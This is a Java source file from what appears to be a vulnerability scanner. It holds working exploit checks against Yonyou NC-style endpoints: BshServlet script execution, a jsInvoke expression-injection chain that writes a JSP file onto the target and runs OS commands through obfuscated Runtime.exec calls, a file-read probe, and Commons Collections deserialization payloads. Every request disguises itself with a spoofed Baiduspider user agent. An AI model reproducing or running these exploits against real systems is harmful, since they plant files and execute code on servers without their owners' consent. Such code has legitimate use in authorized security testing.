package vul;

import Util.HttpUtil;
import Util.RandomStringGenerator;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;
import java.io.InputStream;
import java.net.Proxy;
import java.util.HashMap;
import java.util.Map;


public class check {
//    private InputStream cc6 = exec.class.getResourceAsStream("/cc6-TomcatEcho-Etag.bin");
//
//    private InputStream cc7 = exec.class.getResourceAsStream("/cc7-TomcatEcho-Etag.bin");


    public String checkAction(Map deserializeMap, String vulName, String url, Object proxy) throws IOException {

        String result;
        if ("BshServlet rce".equals(vulName)) {
            result = BshServletRce(url, proxy);
        } else if ("jsInvoke rce".equals(vulName)) {
            result = jsInvokeRce(url, proxy);
        } else if ("NCFindWeb 文件读取/列目录".equals(vulName)) {
            result = NCFindWebFileRead(url, proxy);
        } else if (vulName.contains("反序列化")) {
            String path = (String) deserializeMap.get(vulName);
            result = deserializeAction(url, path, vulName, proxy);
        } else {
            result = "该poc暂未收录";
        }
        return result;

    }

    public String BshServletRce(String url, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        String randomStr = RandomStringGenerator.generateRandomString(10);
        String data = String.format("bsh.script=print(\"%s\");", randomStr);
        RequestBody body = RequestBody.create(data, okhttp3.MediaType.parse("application/x-www-form-urlencoded"));

        Response response = null;
        try {
            response = HttpUtil.post(url + "servlet/~ic/bsh.servlet.BshServlet", headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                String resBody = response.body().string();
                if (resBody.contains(randomStr)) {
                    return "[+]BshServlet rce 漏洞存在!!!";
                } else {
                    return "[-]漏洞不存在";
                }
            } else {
                return "[-]接口不存在";
            }
        } catch (IOException e) {
            
            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

    public String jsInvokeRce(String url, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        String randomStr = RandomStringGenerator.generateRandomString(10);
        String data = String.format("{\n" +
                "                \"serviceName\": \"nc.itf.iufo.IBaseSPService\",\n" +
                "                \"methodName\": \"saveXStreamConfig\",\n" +
                "                \"parameterTypes\": [\n" +
                "                    \"java.lang.Object\",\n" +
                "                    \"java.lang.String\"\n" +
                "                ],\n" +
                "                \"parameters\": [\n" +
                "                    \"${param[param.l]()[param.a](param.b)[param.c]()[param.d](param.e)[param.f](header.%s)}\",\n" +
                "                    \"webapps/nc_web/.%s.jsp\"\n" +
                "                ]\n" +
                "            }", randomStr, randomStr);
        RequestBody body = RequestBody.create(data, okhttp3.MediaType.parse("application/json"));

        Response response = null;
        try {
            response = HttpUtil.post(url + "uapjs/jsinvoke/?action=invoke", headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                headers.put(randomStr, String.format("var s = [7];s[0] = 'c'+'m'+'d';s[1] ='/c';s[2] = '\"e'+'c'+'h'+'o'+' '+'%s\"';s[3] = '|'+'|';s[4] = 'b'+'a'+'s'+'h';s[5] = '-c';s[6] = '\"e'+'c'+'h'+'o'+' '+'%s\"';var p =java.lang.Runtime.getRuntime().\\u0065\\u0078\\u0065\\u0063(s);var sc = new java.util.Scanner(p.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d(),\"GBK\").useDelimiter('\\\\A');var result = sc.hasNext() ? sc.next() : '';sc.close();result;", randomStr, randomStr));
                data = "l=getClass&a=forName&b=javax.script.ScriptEngineManager&c=newInstance&d=getEngineByName&e=js&f=eval";
                RequestBody body2 = RequestBody.create(data, okhttp3.MediaType.parse("application/x-www-form-urlencoded"));
                response = HttpUtil.post(url + String.format(".%s.jsp", randomStr), headers, body2, (HttpUtil.ProxyConfig) proxy);
                statusCode = String.valueOf(response.code());
                String resBody = response.body().string();
                if ("200".equals(statusCode) && resBody.contains(randomStr)) {
                    return "[+]jsInvoke rce 漏洞存在!!!";
                } else {
                    return "[-]漏洞不存在";
                }
            } else {
                return "[-]接口不存在";
            }
        } catch (IOException e) {
            
            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

    public String deserializeAction(String url, String path, String vulName, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        String randomStr = RandomStringGenerator.generateRandomString(10);
        headers.put("Etag", String.format("echo %s", randomStr));
        InputStream data;
        if (vulName.contains("cc6")) {
            data = exec.class.getResourceAsStream("/cc6-TomcatEcho-Etag.bin");
        } else {
            data = exec.class.getResourceAsStream("/cc7-TomcatEcho-Etag.bin");
        }

        RequestBody body = HttpUtil.createRequestBodyFromStream(data, okhttp3.MediaType.parse("application/octet-stream"));
        Response response = null;
        try {
            response = HttpUtil.post(url + path, headers, body, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                String resBody = response.body().string();
                if (resBody.contains(randomStr)) {
                    return String.format("[+]%s 漏洞存在!!!", vulName);
                } else {
                    return "[-]漏洞不存在";
                }
            } else {
                return "[-]接口不存在";
            }
        } catch (IOException e) {
            
            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

    public String NCFindWebFileRead(String url, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        Response response = null;
        try {
            response = HttpUtil.get(url + "NCFindWeb?service=IPreAlertConfigService&filename=admin.jsp", headers, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                String resBody = response.body().string();
                if (resBody.contains("<jsp:param name=\"isAdmin\" value='<%=UAPESAPI.htmlAttributeEncode(\"Y\")%>'")) {
                    return "[+]NCFindWeb 文件读取/列目录 漏洞存在!!!";
                } else {
                    return "[-]漏洞不存在";
                }
            } else {
                return "[-]接口不存在";
            }
        } catch (IOException e) {
            
            return "[-]请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }

}
